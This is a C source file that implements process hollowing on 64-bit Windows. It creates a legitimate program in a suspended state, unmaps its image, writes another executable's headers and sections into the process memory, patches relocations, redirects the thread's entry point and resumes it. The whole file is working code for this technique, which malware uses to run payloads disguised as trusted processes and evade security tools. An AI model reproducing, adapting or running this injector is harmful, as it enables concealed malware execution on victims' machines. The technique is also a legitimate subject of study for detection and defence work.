#include "ProcessHollowing.h"

int ProcessHollowing(char *DestinationProgramPath, char *SourceProgramPath)
{
    /*char target[MAX_PATH] = { 0, };
    char source[MAX_PATH] = { 0, };

    printf("Destination Program : ");
    gets(target);
    printf("Source Program : ");
    gets(source);*/

    STARTUPINFOA si = { 0, };
    PROCESS_INFORMATION pi = { 0, };
    si.cb = sizeof(si);

    CreateProcessA(NULL, DestinationProgramPath, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    if (!pi.hProcess)
    {
        printf("[-] Failed creating process!\n");
        return -1;
    }

    printf("[*] Destination process created!\n");
    printf("[*] PID : %d\n", pi.dwProcessId);

    CONTEXT Context = { 0, };
    Context.ContextFlags = CONTEXT_FULL;

    if (GetThreadContext(pi.hThread, &Context) == NULL)
    {
        printf("[-] Failed get context!\n");
        TerminateProcess(pi.hProcess, 0);
        return -1;
    }

    printf("[*] Destination process PEB : 0x%p\n", Context.Rdx);

    PEB peb = { 0, };

    if (ReadProcessMemory(pi.hProcess, Context.Rdx, &peb, sizeof(PEB), NULL) == NULL)
    {
        printf("[-] Failed get target PEB!\n");
        TerminateProcess(pi.hProcess, 0);
        return -1;
    }

    printf("[*] Destination process ImageBase : 0x%p\n", peb.ImageBaseAddress);

    if (NtUnmapViewOfSection(pi.hProcess, peb.ImageBaseAddress) == STATUS_ACCESS_DENIED)
    {
        printf("[-] Failed unmapping target ImageBase!\n");
        TerminateProcess(pi.hProcess, 0);
        return -1;
    }

    printf("[*] Destination process section unmapping success!\n");

    HANDLE hFile = CreateFileA(SourceProgramPath, GENERIC_READ, NULL, NULL, OPEN_ALWAYS, NULL, NULL);

    if (hFile == INVALID_HANDLE_VALUE)
    {
        printf("[-] File %s open failed!\n", SourceProgramPath);
        TerminateProcess(pi.hProcess, 0);
        return -1;
    }

    printf("[*] Opening source file!\n");

    DWORD FileSize = GetFileSize(hFile, NULL);

    printf("[*] File size : %dByte\n", FileSize);

    BYTE *SourceBuffer = malloc(FileSize);

    ZeroMemory(SourceBuffer, FileSize);

    ReadFile(hFile, SourceBuffer, FileSize, NULL, NULL);

    IMAGE_DOS_HEADER *DOS = SourceBuffer;
    printf("[*] Source DOS header : 0x%p\n", DOS);

    IMAGE_NT_HEADERS64 *NT = (ULONGLONG)DOS + DOS->e_lfanew;
    printf("[*] Source NT header : 0x%p\n", NT);

    IMAGE_SECTION_HEADER (*SECTION)[1] = (ULONGLONG)NT + sizeof(IMAGE_NT_HEADERS64);
    printf("[*] Number of sections : %d\n", NT->FileHeader.NumberOfSections);

    PVOID SrcImageBase = NT->OptionalHeader.ImageBase;
    PVOID DestImageBase = VirtualAllocEx(pi.hProcess, peb.ImageBaseAddress, NT->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (DestImageBase == NULL)
    {
            printf("[-] VirtualAllocEx call failed!\n");
            TerminateProcess(pi.hProcess, 0);
            return -1;
    }

    printf("[*] Source ImageBase : 0x%p\n", SrcImageBase);
    printf("[*] Destination ImageBase : 0x%p\n", peb.ImageBaseAddress);

    NT->OptionalHeader.ImageBase = DestImageBase;

    if (WriteProcessMemory(pi.hProcess, DestImageBase, SourceBuffer, NT->OptionalHeader.SizeOfHeaders, NULL) == NULL)
    {
        printf("[-] Failed writing header!\n");
        TerminateProcess(pi.hProcess, 0);
        return -1;
    }

    for (int i = 0; i < NT->FileHeader.NumberOfSections; i++)
    {
        if (SECTION[i]->PointerToRawData == NULL)
        {
            continue;
        }

        PVOID SrcSectionRowDataPointer = (ULONGLONG)SourceBuffer + SECTION[i]->PointerToRawData;
        PVOID DestSectionVirtualAddress = (ULONGLONG)DestImageBase + SECTION[i]->VirtualAddress;

        printf("[*] Section name : %s\n", SECTION[i]->Name);
        printf("[*] Section PointerToRawData : 0x%p\n", SrcSectionRowDataPointer);
        printf("[*] Section VirtualAddress   : 0x%p\n", DestSectionVirtualAddress);

        if (WriteProcessMemory(pi.hProcess, DestSectionVirtualAddress, SrcSectionRowDataPointer, SECTION[i]->SizeOfRawData, NULL) == NULL)
        {
            printf("[-] Section data writing failed!\n");
            TerminateProcess(pi.hProcess, 0);
            return -1;
        }
    }

    if (DestImageBase != SrcImageBase)
    {
        printf("[*] Relocation hard coding\n");
        IMAGE_BASE_RELOCATION *BASE_RELOCATION = NULL;
        for (int i = 0; i < NT->FileHeader.NumberOfSections; i++)
        {
            if (NT->OptionalHeader.DataDirectory[5].VirtualAddress == SECTION[i]->VirtualAddress)
            {
                BASE_RELOCATION = (ULONGLONG)SourceBuffer + SECTION[i]->PointerToRawData;
                break;
            }
        }

        DWORD SIZE_RELOCTION = NT->OptionalHeader.DataDirectory[5].Size;

        if (BASE_RELOCATION == NULL || SIZE_RELOCTION == 0)
        {
            printf("[-] This source file is not supported relocation(ASLR)\n");
            TerminateProcess(pi.hProcess, 0);
            return -1;
        }

        DWORD SIZE = 0;

        while (SIZE_RELOCTION != SIZE)
        {
            BASE_RELOCATION_ENTRY (*Type)[1] = (ULONGLONG)BASE_RELOCATION + 8;

            for (int i = 0; i < (BASE_RELOCATION->SizeOfBlock - 8) / 2; i++)
            {
                if ((*Type[i]).Offset != NULL)
                {
                    PVOID HardCodingAddress = (ULONGLONG)DestImageBase + BASE_RELOCATION->VirtualAddress + (*Type[i]).Offset;
                    ULONGLONG HardCodingData;

                    if (ReadProcessMemory(pi.hProcess, HardCodingAddress, &HardCodingData, 8, NULL) == NULL)
                    {
                        printf("[-] Reloc Read Failed!\n");
                        continue;
                    }

                    printf("[+] 0x%p : 0x%p -> ", HardCodingAddress, HardCodingData);

                    HardCodingData -= (ULONGLONG)SrcImageBase;
                    HardCodingData += (ULONGLONG)DestImageBase;

                    printf("0x%p\n", HardCodingData);

                    if (WriteProcessMemory(pi.hProcess, HardCodingAddress, &HardCodingData, 8, NULL) == NULL)
                    {
                        printf("[-] Reloc Write Failed!\n");
                        continue;
                    }
                }
            }

            SIZE += BASE_RELOCATION->SizeOfBlock;
            BASE_RELOCATION = (ULONGLONG)BASE_RELOCATION + BASE_RELOCATION->SizeOfBlock;
        }
    }

    ULONGLONG NewEntryPoint = (ULONGLONG)DestImageBase + NT->OptionalHeader.AddressOfEntryPoint;

    printf("[*] NewEntryPoint : 0x%p\n", NewEntryPoint);

    Context.Rcx = NewEntryPoint;

    if (SetThreadContext(pi.hThread, &Context) == NULL)
    {
        printf("[-] Failed setting thread context!\n");
        TerminateProcess(pi.hProcess, 0);
        return -1;
    }

    printf("[*] Setting thread context!\n");

    printf("[*] Resume Thread!\n");

    if (ResumeThread(pi.hThread) == NULL)
    {
        printf("[-] Failed resuming thread!\n");
        TerminateProcess(pi.hProcess, 0);
        return -1;
    }

    printf("[*] Process Hollowing Complete!\n");

    free(SourceBuffer);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}